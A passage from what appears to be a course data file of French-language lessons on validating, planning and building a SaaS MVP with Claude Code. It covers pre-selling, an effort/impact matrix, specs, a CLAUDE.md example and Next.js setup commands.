<li><strong>Le paiement unique de lancement</strong> : "Paye 49 euros une fois et obtiens un accès à vie (la valeur sera de 19 euros/mois)." Cette technique fonctionne très bien sur des plateformes comme Gumroad où LemonSqueezy. Elle te donne du cash immédiat pour financer le développement.</li>
<li><strong>La campagne de pré-commande</strong> : Utilise une plateforme comme Gumroad, LemonSqueezy où même un simple lien Stripe. Présente ton produit, montre des maquettes où une démo vidéo, et propose la pré-commande. Si personne n'achète, tu sais que ton positionnement où ton prix ne fonctionne pas — et tu n'as pas perdu de temps à coder.</li>
</ul>

<h3>Que faire si personne ne paye ?</h3>
<p>C'est une information précieuse, pas un échec. Si 200 personnes visitent ta page de pré-selling et que personne ne paye, ça signifie probablement l'une de ces choses : le prix est trop élevé, le problème n'est pas assez douloureux, où ta communication ne transmet pas assez de valeur. Ajuste et réessaye. Le pré-selling te permet d'itérer sur ton positionnement sans coder.</p>
<p><strong>Attention :</strong> Si tu fais du pré-selling, sois transparent sur le fait que le produit n'est pas encore prêt. Donne une date estimée de lancement et tiens-la. Si tu ne peux pas livrer à temps, communique et propose un remboursement. Ta réputation est ton actif le plus précieux.</p>

<h2>La matrice Effort/Impact</h2>
<p>Tu as validé ton idée et tu as une liste de fonctionnalités pour ton MVP. Maintenant, tu dois prioriser. La matrice Effort/Impact est un outil simple mais puissant pour décider quoi construire en premier. Elle classe chaque fonctionnalité selon deux axes : l'effort nécessaire pour la construire et l'impact qu'elle aura sur les utilisateurs.</p>

<h3>Les quatre quadrants</h3>
<ul>
<li><strong>Quick Wins (faible effort, fort impact)</strong> : Ce sont tes priorités absolues. Des fonctionnalités simples à construire qui apportent beaucoup de valeur. Exemple : un formulaire de contact, une page de pricing claire, un bouton "Exporter en PDF". Avec Claude Code, beaucoup de fonctionnalités tombent dans cette catégorie parce que l'effort de développement est réduit.</li>
<li><strong>Projets majeurs (fort effort, fort impact)</strong> : Des fonctionnalités importantes mais complexes. Le système de paiement Stripe, l'authentification, le tableau de bord avancé. Tu les fais après les Quick Wins, en commençant par la plus impactante.</li>
<li><strong>Fill-ins (faible effort, faible impact)</strong> : Des petites améliorations qui ne changent pas la donne mais qui se font rapidement. Les animations CSS, un favicon personnalisé, un message de confirmation après une action. Tu les fais quand tu as 30 minutes de libre entre deux tâches importantes.</li>
<li><strong>À éviter (fort effort, faible impact)</strong> : Le piège. Ces fonctionnalités sont tentantes parce qu'elles sont techniquement intéressantes, mais elles ne valent pas l'investissement en temps. Le mode sombre, l'intégration avec un outil obscur que 2 % de tes utilisateurs demandent, un système de gamification complexe. Mets-les de côté et ne les construis que si la demande devient massive.</li>
</ul>

<h3>Comment utiliser la matrice en pratique</h3>
<p>Prends chaque fonctionnalité de ta liste et évalue-la sur deux critères :</p>
<ul>
<li><strong>Effort</strong> : Combien de temps faudra-t-il pour la construire avec Claude Code ? 1 heure ? 1 jour ? 1 semaine ?</li>
<li><strong>Impact</strong> : Combien d'utilisateurs seront touchés et à quel point ça améliore leur expérience ? C'est un "must have" où un "nice to have" ?</li>
</ul>
<p>Place chaque fonctionnalité dans un des quatre quadrants. Puis attaque-les dans l'ordre : Quick Wins d'abord, Projets majeurs ensuite, Fill-ins quand tu as le temps, À éviter jamais (pour l'instant).</p>
<p><strong>Conseil pro :</strong> Demande à Claude de t'aider à estimer l'effort de développement. Décris-lui chaque fonctionnalité et demande : "Sur une échelle de 1 (quelques heures) à 5 (plusieurs jours), combien d'effort de développement cette fonctionnalité nécessite-t-elle avec Claude Code ?" Tu auras une estimation réaliste qui t'aidera à remplir ta matrice.</p>
<p><strong>Astuce :</strong> Refais cette matrice toutes les 2 semaines. Les priorités changent au fur et à mesure que tu apprends de tes utilisateurs. Une fonctionnalité classée "à éviter" aujourd'hui peut devenir un "quick win" demain si tes utilisateurs la réclament en masse.</p>

<blockquote>La validation n'est pas une étape — c'est un mode de fonctionnement permanent. Même après le lancement de ton MVP, tu continues de valider chaque nouvelle fonctionnalité avant de la construire. C'est ce qui sépare les entrepreneurs qui réussissent de ceux qui construisent dans le vide.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Passe 30 minutes sur Reddit (r/SaaS, r/startups, r/freelance) où sur des groupes Facebook de ta niche. Note 5 problèmes récurrents exprimés par les membres. Formule chacun en une phrase "problème".</li>
<li>Choisis un de ces problèmes et rédige 6 questions d'entretien suivant la méthode "Mom Test" (questions sur le comportement passé, pas sur les intentions futures).</li>
<li>Demande à Claude : "Crée-moi une landing page de validation pour [ton idée]. La page doit avoir un titre accrocheur, une description du problème, 3 bénéfices clés et un formulaire de collecte d'email. Utilise Next.js et Tailwind CSS." Déploie-la sur Vercel.</li>
<li>Crée une matrice Effort/Impact avec les fonctionnalités de ton MVP. Classe au moins 8 fonctionnalités dans les 4 quadrants. Identifie tes 3 Quick Wins prioritaires.</li>
<li>Écris un message de pré-selling de 5 lignes que tu pourrais poster sur un forum où envoyer par email pour tester l'intérêt pour ton produit. Inclus un prix, une date de lancement estimée et un appel à l'action clair.</li>
</ol>`,
  },
  {
    order: 41,
    module: 5,
    title: "Architecture et planification avec Claude",
    slug: "architecture-planification-claude",
    duration: "55 min",
    description: "Apprendre à planifier ton MVP avant d'écrire la première ligne de code : spécifications, choix technique, architecture et sprints.",
    content: `<h2>Avant de coder : planifier avec Claude</h2>
<p>Tu as validé ton idée. Tu sais quel problème tu résous, pour qui, et tu as des signaux concrets que des gens veulent ta solution. L'envie de foncer tête baissée dans le code est irrésistible — résiste. Les 2-3 heures que tu vas investir dans la planification vont te faire économiser des jours de travail, des refactorisations douloureuses et des bugs évitables.</p>
<p>Pense à ça comme la phase de conception d'une maison. Personne ne commence à poser des briques sans un plan d'architecte. Pourquoi ? Parce que déplacer un mur sur un plan prend 5 minutes, mais déplacer un mur dans une maison construite prend des semaines et coûte une fortune. En développement logiciel, c'est exactement pareil : changer l'architecture d'un projet en cours coûte exponentiellement plus cher que de bien la concevoir au départ.</p>
<p>La bonne nouvelle, c'est que Claude est un excellent partenaire de planification. Tu peux lui décrire ton projet en français et il t'aidera à structurer tes spécifications, choisir les technologies, concevoir l'architecture et planifier tes sprints. C'est comme avoir un CTO expérimenté disponible 24h/24 qui ne juge jamais tes questions.</p>
<p><strong>Astuce :</strong> Commence chaque session de planification avec Claude par un résumé de contexte : "Je crée [type de produit] pour [cible]. Le problème que je résous est [problème]. Les fonctionnalités de mon MVP sont [liste]. Aide-moi à [ce que tu veux planifier]." Plus tu donnes de contexte, plus les suggestions de Claude seront pertinentes et précises.</p>
<p><strong>Attention :</strong> La planification ne doit pas devenir de la procrastination déguisée. L'objectif est de passer 2-3 heures maximum sur la planification avant de commencer à coder. Tu affineras au fur et à mesure. Un plan imparfait exécuté vaut mieux qu'un plan parfait qui reste un document Google Docs.</p>

<h2>Le document de spécifications</h2>
<p>Le document de spécifications (où "spec") est le plan directeur de ton MVP. C'est le document de référence qui décrit exactement ce que tu construis, pour qui, et comment. Tu le partageras avec Claude Code à chaque session de développement pour qu'il ait le contexte complet de ton projet.</p>

<h3>Les éléments de ta spec</h3>
<ul>
<li><strong>Nom du projet</strong> : Le nom de travail de ton produit. Pas besoin du nom final — un nom de code suffit. Exemple : "FacturePro" où "InvoiceApp".</li>
<li><strong>Problème résolu</strong> : La phrase problème que tu as formulée lors de la validation. Une où deux phrases maximum. C'est ta boussole — chaque fonctionnalité que tu ajoutes doit contribuer à résoudre ce problème.</li>
<li><strong>Cible utilisateur</strong> : Qui sont tes utilisateurs ? Sois précis. "Les freelances développeurs web en France qui facturent entre 3 et 15 clients par mois et qui utilisent actuellement Word où Excel pour leurs factures."</li>
<li><strong>Fonctionnalités MVP</strong> : La liste exacte des fonctionnalités de ton MVP, classées par priorité. Utilise le résultat de ta matrice Effort/Impact. Maximum 5-7 fonctionnalités pour un MVP.</li>
<li><strong>User stories</strong> : Des descriptions courtes du parcours utilisateur. Format : "En tant que [rôle], je veux [action] afin de [bénéfice]". Exemple : "En tant que freelance, je veux créer une facture en remplissant un formulaire afin d'envoyer une facture professionnelle à mon client en moins de 2 minutes."</li>
<li><strong>Contraintes et hors-périmètre</strong> : Ce que tu ne construis PAS. C'est aussi important que ce que tu construis. "Hors périmètre pour le MVP : multi-devises, gestion des relances automatiques, intégration comptable, application mobile." Ça t'empêche de dériver.</li>
</ul>

<h3>Exemple concret de spec MVP</h3>
<p>Imaginons un MVP d'outil de suivi de temps pour freelances :</p>
<p><strong>Nom :</strong> TimeTrackr</p>
<p><strong>Problème :</strong> Les freelances perdent de l'argent parce qu'ils oublient de comptabiliser des heures de travail et sous-facturent systématiquement leurs clients.</p>
<p><strong>Cible :</strong> Freelances en prestation de service (développeurs, designers, consultants) qui facturent à l'heure.</p>
<p><strong>Fonctionnalités MVP :</strong></p>
<ul>
<li>Créer un compte et se connecter</li>
<li>Créer des projets avec un nom et un taux horaire</li>
<li>Démarrer/arrêter un timer sur un projet</li>
<li>Voir un récapitulatif hebdomadaire avec les heures par projet et le montant total</li>
<li>Exporter le récapitulatif en PDF</li>
</ul>
<p><strong>Hors périmètre :</strong> Facturation intégrée, gestion d'équipe, intégrations tierces, application mobile, mode hors-ligne.</p>
<p><strong>Conseil pro :</strong> Écris ta spec dans un fichier Markdown (<code>SPEC.md</code>) à la racine de ton projet. Tu pourras le copier-coller au début de chaque conversation avec Claude Code pour lui donner le contexte complet. C'est beaucoup plus efficace que de réexpliquer ton projet à chaque session.</p>

<h2>Choisir la stack technique</h2>
<p>La "stack technique" est l'ensemble des technologies que tu utilises pour construire ton produit. C'est une décision importante parce qu'elle impacte la vitesse de développement, les coûts d'hébergement, la maintenabilité et les possibilités futures. Mais ne passe pas trois semaines à comparer des frameworks — dans le contexte d'un MVP, la meilleure stack est celle avec laquelle tu peux avancer le plus vite.</p>
<p>Voici la stack que nous recommandons pour un MVP — c'est celle que Claude Code maîtrise le mieux et qui offre le meilleur rapport simplicité/puissance :</p>

<h3>Frontend + Backend : Next.js (App Router)</h3>
<p>Next.js combine le frontend et le backend dans un seul projet. Tu n'as pas besoin de gérer deux applications séparées. Le App Router (la version moderne) utilise des Server Components par défaut, ce qui rend les pages plus rapides. Claude Code est extrêmement performant avec Next.js — c'est le framework qu'il connaît le mieux.</p>

<h3>Style : Tailwind CSS</h3>
<p>Tailwind te permet de styliser directement dans le HTML avec des classes utilitaires. Pas de fichiers CSS à gérer, pas de conflits de noms de classes. Claude génère du Tailwind impeccable et tu peux facilement ajuster les styles en modifiant les classes. C'est la solution la plus rapide pour créer des interfaces modernes.</p>

<h3>Base de données : Prisma + PostgreSQL</h3>
<p>Prisma est un ORM (Object-Relational Mapping) qui te permet d'interagir avec ta base de données en TypeScript au lieu de SQL. Tu définis tes modèles de données dans un fichier <code>schema.prisma</code> lisible et Prisma génère tout le code d'accès à la base. Pour l'hébergement de la base PostgreSQL, Neon offre un plan gratuit parfait pour un MVP.</p>

<h3>Authentification : NextAuth.js (Auth.js)</h3>
<p>L'authentification est le sujet le plus complexe du développement web. NextAuth.js gère tout pour toi : connexion par email, Google, GitHub, gestion des sessions, protection des routes. En quelques lignes de configuration, tu as un système d'authentification complet et sécurisé.</p>

<h3>Hébergement : Vercel</h3>
<p>Vercel est la plateforme créée par les développeurs de Next.js. Le déploiement est automatique : tu push ton code sur GitHub, Vercel le détecte et déploie en quelques secondes. Le plan gratuit est largement suffisant pour un MVP. Nom de domaine personnalisé, HTTPS automatique, CDN mondial — tout est inclus.</p>
<p><strong>Attention :</strong> N'essaye pas de réinventer la roue en choisissant des technologies exotiques pour ton MVP. La stack ci-dessus est utilisée par des milliers de startups, elle est bien documentée, et Claude Code la maîtrise parfaitement. Tu auras tout le temps de migrer vers quelque chose de plus personnalisé quand tu auras 10 000 utilisateurs.</p>

<h2>Concevoir l'architecture</h2>
<p>L'architecture de ton projet, c'est la manière dont tu organises tes fichiers, tes composants et tes routes. Une bonne architecture rend le code facile à comprendre, à modifier et à débuguer. Une mauvaise architecture transforme chaque modification en cauchemar.</p>
<p>Avec Next.js App Router, la structure de dossiers suit des conventions claires :</p>

<h3>La structure de dossiers recommandée</h3>
<ul>
<li><code>app/</code> : Les pages et routes de ton application. Chaque dossier dans <code>app/</code> devient une route URL. <code>app/dashboard/page.tsx</code> crée la page <code>/dashboard</code>.</li>
<li><code>app/api/</code> : Les routes API (ton backend). <code>app/api/invoices/route.ts</code> crée l'endpoint <code>/api/invoices</code>.</li>
<li><code>app/layout.tsx</code> : Le layout principal qui enveloppe toutes les pages (header, footer, sidebar).</li>
<li><code>components/</code> : Les composants réutilisables (Button, Card, Modal, Header, Footer).</li>
<li><code>lib/</code> : Les utilitaires et configurations (Prisma client, fonctions d'aide, constantes).</li>
<li><code>prisma/</code> : Le schéma de base de données et les migrations.</li>
<li><code>public/</code> : Les fichiers statiques (images, favicon, fichiers téléchargeables).</li>
</ul>

<h3>Concevoir les composants</h3>
<p>Avant de coder, dessine (même grossièrement sur papier) les principales pages de ton MVP et identifie les composants réutilisables. Par exemple, pour un dashboard :</p>
<ul>
<li><strong>Layout</strong> : Header avec navigation + Sidebar avec menu + Zone de contenu principal</li>
<li><strong>Composants partagés</strong> : Button, Card, Modal, FormInput, DataTable, Badge, Avatar</li>
<li><strong>Pages</strong> : Dashboard (statistiques), Liste des projets, Détail d'un projet, Paramètres du compte</li>
</ul>
<p>L'objectif est d'identifier les éléments qui reviennent sur plusieurs pages pour les créer une seule fois et les réutiliser. Un composant <code>Button</code> bien conçu sera utilisé sur chaque page de ton application.</p>

<h3>Concevoir les routes API</h3>
<p>Liste toutes les opérations que ton backend doit supporter. Pour chaque entité (User, Project, Invoice...), tu auras typiquement :</p>
<ul>
<li><code>GET /api/projects</code> — Lister les projets de l'utilisateur connecté</li>
<li><code>POST /api/projects</code> — Créer un nouveau projet</li>
<li><code>GET /api/projects/[id]</code> — Récupérer un projet spécifique</li>
<li><code>PUT /api/projects/[id]</code> — Modifier un projet</li>
<li><code>DELETE /api/projects/[id]</code> — Supprimer un projet</li>
</ul>
<p><strong>Conseil pro :</strong> Demande à Claude de générer l'architecture complète à partir de ta spec. Le prompt : "Voici les spécifications de mon MVP : [colle ta spec]. Propose-moi une architecture de dossiers complète pour un projet Next.js App Router avec Prisma, les composants principaux, les routes API et le schéma de base de données." Tu obtiendras une vision d'ensemble claire avant de commencer à coder.</p>

<h2>Planifier les sprints</h2>
<p>Un sprint est une période de travail concentré avec un objectif clair. Au lieu de te dire "je dois construire tout le MVP", tu découpes le travail en sprints de 3-4 jours, chacun avec un livrable concret et testable. C'est la méthode agile simplifiée, adaptée à un solo-preneur.</p>

<h3>Sprint 1 (Jours 1-4) : Les fondations</h3>
<ul>
<li>Initialiser le projet Next.js avec Tailwind et Prisma</li>
<li>Configurer la base de données et créer le schéma Prisma</li>
<li>Mettre en place l'authentification (inscription + connexion)</li>
<li>Créer le layout principal (header, sidebar, page de base)</li>
<li><strong>Livrable :</strong> Un utilisateur peut s'inscrire, se connecter et voir un dashboard vide</li>
</ul>

<h3>Sprint 2 (Jours 5-8) : La fonctionnalité principale</h3>
<ul>
<li>Créer les routes API pour l'entité principale (projets, factures, etc.)</li>
<li>Construire les pages de création et de listing</li>
<li>Implémenter les formulaires avec validation</li>
<li><strong>Livrable :</strong> Un utilisateur peut créer, voir et modifier l'entité principale</li>
</ul>

<h3>Sprint 3 (Jours 9-12) : Les fonctionnalités secondaires</h3>
<ul>
<li>Ajouter les fonctionnalités complémentaires du MVP</li>
<li>Créer le tableau de bord avec des statistiques de base</li>
<li>Implémenter l'export (PDF, CSV selon le besoin)</li>
<li><strong>Livrable :</strong> Le MVP est fonctionnel de bout en bout</li>
</ul>

<h3>Sprint 4 (Jours 13-16) : Polish et lancement</h3>
<ul>
<li>Corriger les bugs trouvés pendant les tests</li>
<li>Optimiser le responsive (mobile et tablette)</li>
<li>Ajouter les pages légales (mentions légales, politique de confidentialité)</li>
<li>Configurer le domaine personnalisé et le déploiement final</li>
<li><strong>Livrable :</strong> Le MVP est en ligne et prêt à recevoir des utilisateurs</li>
</ul>
<p><strong>Astuce :</strong> Chaque sprint doit se terminer par un livrable fonctionnel. Pas "j'ai codé des trucs" mais "un utilisateur peut faire [action concrète]". Ça te force à prioriser ce qui est visible et utile plutôt que ce qui est techniquement intéressant mais invisible.</p>

<h2>Créer un CLAUDE.md</h2>
<p>Le fichier <code>CLAUDE.md</code> est un concept puissant : c'est un fichier à la racine de ton projet que Claude Code lit automatiquement au début de chaque session. Il contient le contexte de ton projet, les conventions à respecter et les instructions importantes. C'est comme un brief permanent que tu donnes à Claude — il n'a plus besoin de te poser les mêmes questions à chaque conversation.</p>

<h3>Que mettre dans ton CLAUDE.md</h3>
<ul>
<li><strong>Description du projet</strong> : 2-3 phrases sur ce que fait ton MVP et pour qui.</li>
<li><strong>Stack technique</strong> : Les technologies utilisées (Next.js 14, Tailwind, Prisma, NextAuth, etc.).</li>
<li><strong>Structure du projet</strong> : Les conventions de dossiers et de nommage.</li>
<li><strong>Conventions de code</strong> : Le style de code que tu veux (TypeScript strict, composants fonctionnels, noms de variables en anglais, commentaires en français...).</li>
<li><strong>Commandes utiles</strong> : Les commandes de développement (<code>npm run dev</code>, <code>npx prisma migrate dev</code>, <code>npx prisma studio</code>).</li>
<li><strong>Contexte métier</strong> : Les termes spécifiques à ton domaine. Si tu crées un outil de facturation, explique la différence entre un devis et une facture, les mentions légales obligatoires en France, etc.</li>
<li><strong>Ce qu'il ne faut PAS faire</strong> : Les anti-patterns à éviter. "Ne jamais utiliser any en TypeScript", "Toujours utiliser des Server Components sauf si useState où useEffect est nécessaire", "Ne pas installer de nouvelles librairies sans demander d'abord".</li>
</ul>

<h3>Exemple de CLAUDE.md</h3>
<p>Voici un exemple concret pour te donner une idée de la structure :</p>
<p><code># TimeTrackr — CLAUDE.md</code></p>
<p><code>## Projet</code></p>
<p><code>TimeTrackr est un outil de suivi de temps pour freelances. Stack : Next.js 14 App Router, TypeScript, Tailwind CSS, Prisma, PostgreSQL (Neon), NextAuth.js, Vercel.</code></p>
<p><code>## Conventions</code></p>
<p><code>- TypeScript strict (pas de any)</code></p>
<p><code>- Composants dans /components, utilitaires dans /lib</code></p>
<p><code>- Server Components par défaut, 'use client' seulement quand nécessaire</code></p>
<p><code>- Noms de fichiers en kebab-case, composants en PascalCase</code></p>
<p><code>## Commandes</code></p>
<p><code>- npm run dev : démarrer le serveur de développement</code></p>
<p><code>- npx prisma studio : visualiser la base de données</code></p>
<p><code>- npx prisma migrate dev : appliquer les migrations</code></p>
<p><strong>Conseil pro :</strong> Fais évoluer ton <code>CLAUDE.md</code> au fur et à mesure du développement. Chaque fois que Claude fait une erreur récurrente (utiliser <code>any</code>, oublier la gestion d'erreur, etc.), ajoute une règle dans le fichier. En quelques jours, Claude connaîtra parfaitement les conventions de ton projet et fera de moins en moins d'erreurs.</p>

<h2>Les prompts de planification</h2>
<p>Pour tirer le maximum de Claude pendant la phase de planification, utilise des prompts structurés. Voici des templates éprouvés que tu peux copier-coller et adapter à ton projet.</p>

<h3>Prompt 1 : Générer les spécifications</h3>
<p>Utilise ce prompt pour transformer une idée vague en spécifications structurées :</p>
<p><code>"Je veux créer [description de ton produit] pour [cible]. Le problème que je résous : [problème]. Les fonctionnalités MVP que j'ai identifiées : [liste]. Génère un document de spécifications complet avec : le nom du projet, le problème résolu, la cible utilisateur, les user stories, les fonctionnalités détaillées avec les critères d'acceptation, et les éléments hors périmètre."</code></p>

<h3>Prompt 2 : Proposer la stack technique</h3>
<p><code>"Voici les specs de mon MVP : [colle tes specs]. Propose-moi une stack technique adaptée avec les justifications pour chaque choix. Inclus : le framework frontend/backend, le système de style, l'ORM et la base de données, l'authentification, l'hébergement, et les services tiers nécessaires (email, paiement, etc.)."</code></p>

<h3>Prompt 3 : Générer les user stories</h3>
<p><code>"Voici les specs de mon MVP : [colle tes specs]. Génère toutes les user stories au format 'En tant que [rôle], je veux [action] afin de [bénéfice]'. Classe-les par priorité (P1 = MVP indispensable, P2 = important mais pas pour le MVP, P3 = nice-to-have). Pour chaque user story P1, ajoute les critères d'acceptation."</code></p>

<h3>Prompt 4 : Concevoir le schéma de base de données</h3>
<p><code>"Voici les specs et user stories de mon MVP : [colle]. Propose un schéma de base de données Prisma complet. Inclus tous les modèles, les champs avec leurs types, les relations entre les modèles, et les index nécessaires pour les performances. Ajoute des commentaires pour expliquer les choix."</code></p>

<h3>Prompt 5 : Planifier les sprints</h3>
<p><code>"Voici les specs complètes de mon MVP : [colle]. Je suis un solo-preneur non-technique qui utilise Claude Code. Découpe le développement en 4 sprints de 3-4 jours. Pour chaque sprint, liste les tâches concrètes, le livrable attendu, et les critères de validation. Le sprint 1 doit poser les fondations techniques."</code></p>
<p><strong>Astuce :</strong> Sauvegarde les résultats de chaque prompt dans un fichier de ton projet (<code>docs/specs.md</code>, <code>docs/architecture.md</code>, <code>docs/sprints.md</code>). Tu auras une documentation complète de ton projet que tu pourras référencer à tout moment et partager avec Claude Code dans les sessions suivantes.</p>

<blockquote>Un développeur senior passe plus de temps à planifier qu'à coder. Avec Claude Code, tu as la puissance d'un développeur senior pour la planification ET pour le code. Utilise les deux. Ne saute pas la planification sous prétexte que le code sera rapide à écrire.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Rédige un document de spécifications complet pour ton MVP en suivant le template de la leçon : nom, problème, cible, fonctionnalités MVP (max 5), 5 user stories P1 avec critères d'acceptation, et éléments hors périmètre. Sauvegarde-le dans un fichier <code>SPEC.md</code>.</li>
<li>Utilise le "Prompt 2" de la leçon pour demander à Claude de te proposer une stack technique. Compare sa proposition avec la stack recommandée (Next.js, Tailwind, Prisma, NextAuth, Vercel). Demande-lui de justifier chaque différence s'il y en a.</li>
<li>Utilise le "Prompt 4" pour demander à Claude de concevoir ton schéma Prisma complet. Vérifie que chaque modèle à un <code>id</code>, <code>createdAt</code> et <code>updatedAt</code>, et que les relations entre modèles correspondent à tes user stories.</li>
<li>Planifie tes 4 sprints en suivant le modèle de la leçon. Pour chaque sprint, écris le livrable en une phrase commençant par "Un utilisateur peut...".</li>
<li>Crée un fichier <code>CLAUDE.md</code> pour ton projet avec au minimum : la description du projet, la stack technique, les conventions de code et les commandes utiles. C'est le fichier que Claude Code lira au début de chaque session.</li>
</ol>`,
  },
  {
    order: 42,
    module: 5,
    title: "Coder le MVP : frontend avec Claude Code",
    slug: "coder-mvp-claude-code-frontend",
    duration: "55 min",
    description: "Passer à l'action : initialiser le projet, créer les pages et les composants avec Claude Code, et tester au fur et à mesure.",
    content: `<h2>C'est parti : on construit</h2>
<p>Tu as ta spec, ton architecture, tes sprints planifiés et ton fichier <code>CLAUDE.md</code>. Il est temps de passer à l'action et de transformer tout ça en un vrai produit. Cette leçon couvre le Sprint 1 du frontend : initialiser le projet, créer la structure des pages, construire les composants et avoir une application fonctionnelle que tu peux voir dans ton navigateur.</p>
<p>Rappelle-toi : tu ne codes pas seul. Claude Code est ton partenaire de développement. Tu lui décris ce que tu veux, il génère le code, tu vérifies le résultat et tu itères. Le cycle est rapide : décris, génère, vérifie, ajuste. En une journée de travail concentré, tu peux avoir un frontend complet et fonctionnel.</p>
<p>L'état d'esprit à adopter est celui du pilote, pas du mécanicien. Tu ne vas pas écrire chaque ligne de code toi-même — tu vas diriger Claude Code en lui donnant des instructions claires et en validant le résultat. Si quelque chose ne te plaît pas, tu lui dis quoi changer. Si tu ne comprends pas un morceau de code, tu lui demandes de t'expliquer. C'est une collaboration, pas une dictée.</p>
<p><strong>Conseil pro :</strong> Avant de commencer, assure-toi d'avoir Node.js installé sur ton ordinateur (version 18 où supérieure). Vérifie avec <code>node --version</code> dans ton terminal. Si ce n'est pas installé, va sur nodejs.org et télécharge la version LTS. C'est le seul prérequis technique.</p>
<p><strong>Astuce :</strong> Travaille par sessions de 90 minutes maximum. Au-delà, la fatigue s'installe et tu commences à accepter du code sans le vérifier. Mieux vaut 3 sessions de 90 minutes avec des pauses qu'une session marathon de 6 heures où tu perds en lucidité.</p>

<h2>Initialiser le projet</h2>
<p>La première étape est de créer le projet Next.js. Une seule commande suffit pour générer toute la structure de base avec les bonnes configurations. Ouvre ton terminal et lance :</p>
<p><code>npx create-next-app@latest mon-mvp</code></p>
<p>L'outil te posera une série de questions. Voici les réponses recommandées pour un MVP :</p>
<ul>
<li><strong>Would yoù like to use TypeScript?</strong> — <strong>Yes</strong>. TypeScript attrape les erreurs avant l'exécution et améliore l'autocomplétion. Claude Code génère du TypeScript de haute qualité.</li>
<li><strong>Would yoù like to use ESLint?</strong> — <strong>Yes</strong>. ESLint vérifie la qualité de ton code automatiquement et signale les erreurs courantes.</li>
<li><strong>Would yoù like to use Tailwind CSS?</strong> — <strong>Yes</strong>. C'est notre framework de style, comme prévu dans la stack.</li>
<li><strong>Would yoù like your code inside a src/ directory?</strong> — <strong>No</strong>. Garder les fichiers à la racine simplifie la structure pour un MVP. Claude Code travaille mieux avec cette convention.</li>
<li><strong>Would yoù like to use App Router?</strong> — <strong>Yes</strong>. C'est la version moderne de Next.js avec les Server Components.</li>
<li><strong>Would yoù like to use Turbopack?</strong> — <strong>Yes</strong>. C'est le nouveau bundler ultra-rapide de Next.js qui accélère le rechargement en développement.</li>
<li><strong>Would yoù like to customize the import alias?</strong> — <strong>No</strong>. L'alias par défaut <code>@/</code> est parfait.</li>
</ul>
<p>Une fois le projet créé, entre dans le dossier et installe les dépendances supplémentaires :</p>
<p><code>cd mon-mvp</code></p>
<p><code>npm install prisma @prisma/client next-auth@beta</code></p>
<p><code>npx prisma init</code></p>
<p>Tu as maintenant un projet complet avec Next.js, TypeScript, Tailwind CSS, Prisma et NextAuth. Lance le serveur de développement avec <code>npm run dev</code> et ouvre <code>http://localhost:3000</code> dans ton navigateur. Tu devrais voir la page d'accueil par défaut de Next.js.</p>
<p><strong>Attention :</strong> Ne modifie pas la page d'accueil par défaut avant d'avoir vérifié que le serveur tourne correctement. Si tu vois la page Next.js dans ton navigateur, tout est bon. Si tu as une erreur, vérifie que Node.js est bien installé et que tu es dans le bon dossier.</p>
<p><strong>Astuce :</strong> Crée immédiatement ton fichier <code>CLAUDE.md</code> à la racine du projet et ton fichier <code>.env</code> avec les variables d'environnement nécessaires (DATABASE_URL, NEXTAUTH_SECRET, NEXTAUTH_URL). Claude Code pourra lire le <code>CLAUDE.md</code> automatiquement dès la prochaine session.</p>

<h2>La structure des pages Next.js</h2>
<p>Avec le App Router de Next.js, chaque page de ton application correspond à un fichier <code>page.tsx</code> dans un dossier du répertoire <code>app/</code>. C'est un système de routage basé sur les fichiers — pas besoin de configurer les routes manuellement comme dans d'autres frameworks.</p>

<h3>Le principe du file-based routing</h3>
<ul>
<li><code>app/page.tsx</code> correspond à la route <code>/</code> (la page d'accueil)</li>
<li><code>app/dashboard/page.tsx</code> correspond à la route <code>/dashboard</code></li>
<li><code>app/dashboard/settings/page.tsx</code> correspond à la route <code>/dashboard/settings</code></li>
<li><code>app/projects/[id]/page.tsx</code> correspond à la route <code>/projects/123</code> (route dynamique — le <code>[id]</code> est remplacé par la valeur réelle)</li>
</ul>
<p>C'est intuitif : la structure de tes dossiers EST la structure de tes URLs. Si tu veux créer une nouvelle page, tu crées un nouveau dossier avec un fichier <code>page.tsx</code> à l'intérieur. C'est tout.</p>

<h3>Le fichier layout.tsx</h3>
<p>Le fichier <code>layout.tsx</code> définit un layout partagé entre plusieurs pages. Le layout racine (<code>app/layout.tsx</code>) enveloppe toutes les pages de ton application — c'est l'endroit idéal pour mettre le header, le footer et la sidebar qui apparaissent sur chaque page. Tu peux aussi créer des layouts imbriqués : <code>app/dashboard/layout.tsx</code> ajoutera un layout spécifique aux pages du dashboard (par exemple, une sidebar de navigation).</p>
<p>La beauté de ce système, c'est que les layouts sont persistants. Quand tu navigues entre <code>/dashboard</code> et <code>/dashboard/settings</code>, le layout du dashboard ne se recharge pas — seul le contenu de la page change. Ça rend la navigation instantanée et fluide.</p>

<h3>Les fichiers spéciaux</h3>
<ul>
<li><code>loading.tsx</code> : Affiché pendant le chargement d'une page (un spinner où un skeleton).</li>
<li><code>error.tsx</code> : Affiché quand une erreur survient dans la page.</li>
<li><code>not-found.tsx</code> : La page 404 personnalisée.</li>
</ul>
<p><strong>Conseil pro :</strong> Pour ton MVP, commence par créer les pages essentielles. Un bon point de départ : <code>app/page.tsx</code> (landing page), <code>app/login/page.tsx</code> (connexion), <code>app/register/page.tsx</code> (inscription), <code>app/dashboard/page.tsx</code> (tableau de bord), <code>app/dashboard/layout.tsx</code> (layout avec sidebar). Tu ajouteras les autres pages au fur et à mesure.</p>

<h2>Les composants : penser en blocs</h2>
<p>Un composant React, c'est un bloc d'interface réutilisable. Au lieu de copier-coller le même bout de code sur 5 pages, tu crées un composant une seule fois et tu l'utilises partout. C'est le concept le plus important de React et celui qui te fera gagner le plus de temps avec Claude Code.</p>

<h3>La hiérarchie des composants</h3>
<p>Pense à ton interface comme un ensemble de boîtes imbriquées, du plus général au plus spécifique :</p>
<ul>
<li><strong>Layout</strong> : La structure globale de la page (header + sidebar + zone de contenu).</li>
<li><strong>Pages</strong> : Le contenu spécifique de chaque route (DashboardPage, ProjectsPage, SettingsPage).</li>
<li><strong>Sections</strong> : Les blocs d'une page (StatsSection, RecentProjectsSection, QuickActionsSection).</li>
<li><strong>Composants UI</strong> : Les éléments réutilisables (Button, Card, Modal, Input, Badge, Avatar, DataTable).</li>
</ul>
<p>Par exemple, ta page Dashboard pourrait se décomposer ainsi : le Layout contient un Header et une Sidebar, la zone de contenu affiche la DashboardPage qui contient une StatsSection (avec 4 composants StatsCard) et une RecentProjectsSection (avec un composant DataTable). Chaque StatsCard utilise un composant Card avec un Badge pour le pourcentage d'évolution.</p>

